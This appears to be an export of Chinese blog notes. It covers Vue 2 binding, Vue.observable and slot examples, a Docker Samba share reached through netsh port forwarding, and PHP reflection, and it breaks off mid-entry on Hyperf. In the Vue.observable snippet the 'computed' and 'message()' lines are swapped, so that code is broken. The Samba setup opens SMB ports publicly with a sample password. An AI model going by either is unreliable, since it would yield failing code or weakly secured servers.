<h3 id="8-class和style的绑定用法"><a href="#8-class和style的绑定用法" class="headerlink" title="8 class和style的绑定用法"></a>8 <code>class</code>和<code>style</code>的绑定用法</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>class 和 style 绑定的高级用法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"['active', 'normal']"</span>&gt;</span>数组绑定多个class<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"[&#123;active: isActive&#125;, 'normal']"</span>&gt;</span>数组包含对象绑定class<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"[showWarning(), 'normal']"</span>&gt;</span>数组包含方法绑定class<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">:style</span>=<span class="string">"[warning, bold]"</span>&gt;</span>数组绑定多个style<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">:style</span>=<span class="string">"[warning, mix()]"</span>&gt;</span>数组包含方法绑定style<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">:style</span>=<span class="string">"&#123; display: ['-webkit-box', '-ms-flexbox', 'flex'] &#125;"</span>&gt;</span>style多重值,从flex开始，尝试是否兼容，反之则换下一个尝试，一直下去<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#root'</span>,</span></span><br><span class="line">        data() &#123;</span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">            isActive: <span class="literal">true</span>,</span></span><br><span class="line">            warning: &#123;</span><br><span class="line"><span class="javascript">              color: <span class="string">'orange'</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            bold: &#123;</span><br><span class="line"><span class="javascript">              fontWeight: <span class="string">'bold'</span></span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">          showWarning() &#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="string">'warning'</span></span></span><br><span class="line">          &#125;,</span><br><span class="line">          mix() &#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line">              ...this.bold,</span><br><span class="line">              fontSize: 20</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="9-Vue-observable全局状态管理-Vue-2-6"><a href="#9-Vue-observable全局状态管理-Vue-2-6" class="headerlink" title="9 Vue.observable全局状态管理(Vue 2.6)"></a>9 <code>Vue.observable</code>全局状态管理(Vue 2.6)</h3><p>&emsp; <code>&quot;Vue.observable</code>通常用于保存全局状态，类似于<code>Vuex</code>,但更简单。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue.observable的使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root1"</span>&gt;</span></span><br><span class="line">           组件1状态：</span><br><span class="line">            &#123;&#123;message&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root2"</span>&gt;</span></span><br><span class="line">            组件2状态: &#123;&#123;message&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root3"</span>&gt;</span></span><br><span class="line">            输入状态: <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"new_message"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> state = Vue.observable(&#123; <span class="attr">message</span>: <span class="string">'Vue 2.6'</span> &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> mutation = &#123;</span></span><br><span class="line">                setMessage(value) &#123;</span><br><span class="line">                    state.message = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="comment">//组件1</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root1'</span>,</span></span><br><span class="line">                message() &#123;</span><br><span class="line">                computed: &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> state.message;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="comment">// 组件2</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root2'</span>,</span></span><br><span class="line">                computed: &#123;</span><br><span class="line">                    message() &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> state.message;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="comment">// 修改状态</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root3'</span>,</span></span><br><span class="line">                watch: &#123;</span><br><span class="line">                    new_message(value) &#123;</span><br><span class="line">                        mutation.setMessage(value)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                data: &#123;</span><br><span class="line">                    new_message: state.message</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div></p>
<h3 id="10-slot插槽的使用"><a href="#10-slot插槽的使用" class="headerlink" title="10 slot插槽的使用"></a>10 <code>slot</code>插槽的使用</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue.observable的使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">H1</span>&gt;</span>案例1： slot的基本用法<span class="tag">&lt;/<span class="name">H1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Test</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot</span>=<span class="string">"slot_data"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span>&gt;</span>默认修改无name slot:修改所有默认插槽内的默认参数并打印所有参数: &#123;&#123;slot_data&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:foo</span>=<span class="string">"foo_slot"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span>&gt;</span>指定修改:修改通过v-slot:name指定foo插槽，并进行修改&#123;&#123;foo_slot&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:bar</span>=<span class="string">"&#123;component_data&#125;"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span>&gt;</span>指定修改:修改bar插槽，并把组件的数据也传进来&#123;&#123;component_data&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root2"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">h1</span>&gt;</span>案例2: 动态插槽<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Test</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:</span>[<span class="attr">section</span>]=<span class="string">"slot"</span>&gt;</span></span><br><span class="line">                   当前指定的插槽为: &#123;&#123;section&#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"change"</span>&gt;</span>更换插槽<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            Vue.component(<span class="string">'Test'</span>, &#123;</span></span><br><span class="line">                template:</span><br><span class="line"><span class="javascript">                    <span class="string">'&lt;div&gt;'</span> +</span></span><br><span class="line"><span class="xml">                        '<span class="tag">&lt;<span class="name">slot</span>  <span class="attr">name</span>=<span class="string">"foo"</span> <span class="attr">:from_component_data</span>=<span class="string">"obj"</span> <span class="attr">:foo</span>=<span class="string">"\'be_define_in_template\'"</span>&gt;</span>' +</span></span><br><span class="line"><span class="xml">                            '<span class="tag">&lt;<span class="name">div</span>&gt;</span>未修改:you don`t change me, I`m foot slot<span class="tag">&lt;/<span class="name">div</span>&gt;</span>' +</span></span><br><span class="line"><span class="javascript">                        <span class="string">'&lt;/slot&gt;'</span> +</span></span><br><span class="line"><span class="xml">                        '<span class="tag">&lt;<span class="name">slot</span>  <span class="attr">name</span>=<span class="string">"bar"</span> <span class="attr">:component_data</span>=<span class="string">"obj"</span> &gt;</span>' +</span></span><br><span class="line"><span class="xml">                        '   <span class="tag">&lt;<span class="name">div</span>&gt;</span>未修改:you don`t change me, I`m bar slot<span class="tag">&lt;/<span class="name">div</span>&gt;</span>' +</span></span><br><span class="line"><span class="javascript">                        <span class="string">'&lt;/slot&gt;'</span> +</span></span><br><span class="line"><span class="xml">                        '<span class="tag">&lt;<span class="name">slot</span> <span class="attr">:data_from_own</span>=<span class="string">"obj"</span> <span class="attr">:define_on_template</span>=<span class="string">"\'hello world\'"</span>&gt;</span>\<span class="tag">&lt;<span class="name">'</span> +</span></span></span><br><span class="line"><span class="javascript">                            <span class="string">'div&gt;未修改:the third slot&lt;/div&gt;'</span> +</span></span><br><span class="line"><span class="javascript">                        <span class="string">'&lt;/slot&gt;'</span> +</span></span><br><span class="line"><span class="xml">                        '<span class="tag">&lt;<span class="name">slot</span> <span class="attr">:data_from_own</span>=<span class="string">"obj"</span> <span class="attr">:define_on_template</span>=<span class="string">"\'hello world\'"</span>&gt;</span>' +</span></span><br><span class="line"><span class="xml">                            '<span class="tag">&lt;<span class="name">div</span>&gt;</span>未修改:the fourth slot<span class="tag">&lt;/<span class="name">div</span>&gt;</span>' +</span></span><br><span class="line"><span class="javascript">                        <span class="string">'&lt;/slot&gt;'</span> +</span></span><br><span class="line"><span class="xml">                        '<span class="tag">&lt;<span class="name">slot</span>  <span class="attr">name</span>=<span class="string">"last_slot"</span> &gt;</span>' +</span></span><br><span class="line"><span class="xml">                        '   <span class="tag">&lt;<span class="name">div</span>&gt;</span>未修改:you don`t change me, I`m bar last_slot<span class="tag">&lt;/<span class="name">div</span>&gt;</span>' +</span></span><br><span class="line"><span class="javascript">                        <span class="string">'&lt;/slot&gt;'</span> +</span></span><br><span class="line"><span class="javascript">                    <span class="string">'&lt;/div&gt;'</span>,</span></span><br><span class="line">                data() &#123;</span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line">                        obj : &#123; a: 1, b: 2&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123; <span class="attr">el</span>: <span class="string">'#root'</span>&#125;);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">                el: <span class="string">'#root2'</span>,</span></span><br><span class="line">                data: &#123;</span><br><span class="line"><span class="javascript">                    section: <span class="string">'foo'</span></span></span><br><span class="line">                &#125;,</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    change() &#123;</span><br><span class="line"><span class="javascript">                        <span class="keyword">let</span> slots = [<span class="string">'foo'</span>, <span class="string">'bar'</span>, <span class="string">'last_slot'</span>];</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">this</span>.section = slots[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*slots.length)];</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>【linux】linux学习笔记-samba共享文件夹初探</title>
    <url>/2020/02/11/%E3%80%90linux%E3%80%91samba%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h3 id="1-什么是samba"><a href="#1-什么是samba" class="headerlink" title="1 什么是samba?"></a>1 什么是samba?</h3><p> &emsp;<code>samba</code>是基于<code>smb</code>传输协议的数据共享软件，通常用于提供跨平台跨主机的文件共享服务。</p>
<h4 id="2-主控端-服务端-安装samba"><a href="#2-主控端-服务端-安装samba" class="headerlink" title="2 主控端(服务端)安装samba"></a>2 主控端(服务端)安装<code>samba</code></h4><h5 id="2-1-准备工作"><a href="#2-1-准备工作" class="headerlink" title="2.1 准备工作:"></a>2.1 准备工作:</h5><pre><code>一台安装好`docker`的`linux`主机.不知道安装可以参考[官方文档](https://docs.docker.com/)
</code></pre><h5 id="2-2-启动服务"><a href="#2-2-启动服务" class="headerlink" title="2.2 启动服务"></a>2.2 启动服务</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">docker run -it -p 139:139 -p 62727:445 \</span><br><span class="line">			-p 137:137/udp -p 138:138/udp \</span><br><span class="line">            -v /www/wwwroot/:/share/ \</span><br><span class="line">            --name smb \</span><br><span class="line">            -d dperson/samba -p \</span><br><span class="line">            -u <span class="string">"example1;badpass"</span> \</span><br><span class="line">            -s <span class="string">"public;/share/public"</span> \</span><br><span class="line">            -s <span class="string">"example1;/share/example1;no;no;no;example1"</span></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>以上是把本地目录挂载的容器中去，并基于挂载的目录上再创建共享的目录，分别创建2个目录<code>public</code>和<code>example1</code>目录，一个是公开的，但不能写，一个是要账号密码的，并配置可以进行读写。更多的配置参数参数可以参考镜像的<span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL2RwZXJzb24vc2FtYmE=" title="https://hub.docker.com/r/dperson/samba">说明<i class="fa fa-external-link"></i></span>。<br><a id="more"></a><br><div class="note warning">
            <p>2017 5月比特币勒索病毒事件导致<code>445</code>端口至今还被网络运营商品封住，这里使用<code>62727</code>端口来替代。</p>
          </div></p>
</blockquote>
<h5 id="2-3-开放端口"><a href="#2-3-开放端口" class="headerlink" title="2.3 开放端口"></a>2.3 开放端口</h5><p>&emsp;在<code>linux</code>如果你是<code>iptables</code>防火墙则<code>IO</code>策略为:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -I INPUT -p tcp --dport 139 -j ACCEPT</span><br><span class="line">sudo iptables -I INPUT -p tcp --dport 62727 -j ACCEPT </span><br><span class="line">sudo iptables -I INPUT -p udp --dport 137 -j ACCEPT</span><br><span class="line">sudo iptables -I INPUT -p udp --dport 138 -j ACCEPT</span><br></pre></td></tr></table></figure></div></p>
<p>&emsp;如果是其它的防火墙，请查阅相关的资料。<br>&emsp;最终的效果是让外网能访问到这4个端口，测试可以是<code>telnet</code>工具测试<code>tcp</code>的端口<code>139</code>和<code>62727</code>格式为<code>telnet &lt;IP&gt; &lt;port&gt;</code> 能连接上则表明端口已经正常了。建议是用<code>nmap</code>的端口扫描工具来，格式为<code>nmap &lt;IP&gt;</code> 最终能访问的端口都会显示出来。<br><div class="note warning">
            <p>一定要在用户机子上进行测试为准。</p>
          </div></p>
<h3 id="3-在windows下连接"><a href="#3-在windows下连接" class="headerlink" title="3 在windows下连接"></a>3 在<code>windows</code>下连接</h3><p>&emsp;由于网民的<code>445</code>端口出方向被封了。需要访问的数据转发到能访问的<code>62727</code>端口上,流程大致为:</p>
<pre class="mermaid">graph TB
    本地127.0.0.1--62727端口-->宿主机:62727端口
    subgraph 主控端
    宿主机:62727端口--455端口-->容器提供的服务
    end
    subgraph 用户端
    共享文件夹连接本地--445端口-->本地127.0.0.1
    end</pre>


<h4 id="3-1-配置用户端端口转发"><a href="#3-1-配置用户端端口转发" class="headerlink" title="3.1 配置用户端端口转发"></a>3.1 配置用户端端口转发</h4><p>打开<code>cmd</code>，以管理员身份打开(如果不是则<code>ctrl+R</code>,然后<code>Ctrl+Shift+Enter</code>切换).<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=445 connectaddress=远程ip connectport=62727</span><br></pre></td></tr></table></figure></div></p>
<p>查看是否生效可以再输入:<code>netsh interface portproxy show all</code>来查询已经生效的端口转发<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Microsoft Windows [Version 10.0.18362.592]</span><br><span class="line">(c) 2019 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">Listen on ipv4:             Connect to ipv4:</span><br><span class="line"></span><br><span class="line">Address         Port        Address         Port</span><br><span class="line">--------------- ----------  --------------- ----------</span><br><span class="line">*               445         120.132.11. 62727</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div></p>
<p>如果要删除则<code>netsh interface portproxy delete v4tov4 listenaddress=欲删除项目的监听IP listenport=欲删除项目的监听端口</code><br>&emsp; 最后<code>Ctrl-R</code> 然后输入<code>\\127.0.0.1</code>就可以访问了不用密码的公开目录，而<code>\\127.0.0.1\example1</code>输入下密码就能访问账号下的目录了。需要添加快捷方式则在文件管理器中配置下网络位置方便下次使用.</p>
<p>本文资料参考于：<br>    端口转发内容部分: <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzU5ODE0OTEy" title="https://www.zhihu.com/question/59814912">https://www.zhihu.com/question/59814912<i class="fa fa-external-link"></i></span><br>    <code>cmd</code>管理员部分: <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5d19hbnF1YW4vYXJ0aWNsZS9kZXRhaWxzLzc3NTY0OTk=" title="https://blog.csdn.net/zyw_anquan/article/details/7756499">https://blog.csdn.net/zyw_anquan/article/details/7756499<i class="fa fa-external-link"></i></span><br>    镜像内容部分: <span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL2RwZXJzb24vc2FtYmE=" title="https://hub.docker.com/r/dperson/samba">https://hub.docker.com/r/dperson/samba<i class="fa fa-external-link"></i></span><br>    本地转发部分: <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N4d2l0aHl4eS9hcnRpY2xlL2RldGFpbHMvODM4NjQ4MjQ=" title="https://blog.csdn.net/cxwithyxy/article/details/83864824">https://blog.csdn.net/cxwithyxy/article/details/83864824<i class="fa fa-external-link"></i></span><br>    <code>docker</code>案例部分: <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmpvZWZvbS5jb20vYXJjaGl2ZXMvMTY0" title="https://blog.joefom.com/archives/164">https://blog.joefom.com/archives/164<i class="fa fa-external-link"></i></span></p>
<p>相关资料:<br>    smbclient使用说明: <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lleGlhbmdjc2RuL2FydGljbGUvZGV0YWlscy84Mjg2NzQ2OQ==" title="https://blog.csdn.net/yexiangcsdn/article/details/82867469">https://blog.csdn.net/yexiangcsdn/article/details/82867469<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>文件共享</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】反射类笔记</title>
    <url>/2020/02/08/%E3%80%90php%E3%80%91%E5%8F%8D%E5%B0%84%E7%B1%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="1反射实例一个类"><a href="#1反射实例一个类" class="headerlink" title="1反射实例一个类"></a>1反射实例一个类</h3><h4 id="1-1-composer-初始化"><a href="#1-1-composer-初始化" class="headerlink" title="1.1 composer 初始化"></a>1.1 <code>composer</code> 初始化</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ composer init; <span class="comment"># 一路回车</span></span><br></pre></td></tr></table></figure></div>
<p>&emsp;文件内容<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"www/tmp"</span>,</span><br><span class="line">    <span class="attr">"authors"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"wuchuheng"</span>,</span><br><span class="line">            <span class="attr">"email"</span>: <span class="string">"root@wuchuheng.com"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"require"</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">"autoload"</span>: &#123;</span><br><span class="line">        <span class="attr">"psr-4"</span>: &#123;</span><br><span class="line">            <span class="attr">"App\\"</span>: <span class="string">"app/"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>&emsp;配置好<code>composer.json</code>后运行<code>composer dump-autoload</code> 使配置生效</p>
<a id="more"></a>
<h4 id="1-2-启动文件和要实例化的文件"><a href="#1-2-启动文件和要实例化的文件" class="headerlink" title="1.2 启动文件和要实例化的文件"></a>1.2 启动文件和要实例化的文件</h4><p>&emsp;示例类<code>app/Index.php</code><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">'hello world'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>&emsp;在根目录下新建开始文件<code>start.php</code><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span><span class="string">"./vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line">$Re = <span class="keyword">new</span> \ReflectionClass(App\Index::class);</span><br><span class="line">$contents = $Re-&gt;newInstanceArgs()-&gt;say();</span><br><span class="line">var_dump($contents); <span class="comment">// hello world</span></span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>composer</tag>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】hyperf笔记-依赖注入</title>
    <url>/2020/02/03/%E3%80%90php%E3%80%91hyperf%E7%AC%94%E8%AE%B0-%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="什么是依赖注入？"><a href="#什么是依赖注入？" class="headerlink" title="什么是依赖注入？"></a>什么是依赖注入？</h3><p>&emsp;依赖注入就是<code>AOP</code>切面编程，把一个需求实例化的类通过反射机制在一个统一的地方进行实例化，期间通过类型提示的参数对应的依赖类赋值给这个类，然后返回这个实例。</p>
<div style="display:none">


<p><pre class="mermaid">classDiagram<br>class 容器<br>class 实例{<br>    &lt;<instance>&gt;</instance></pre></p>
<pre><code>- $userInfo : object App\User
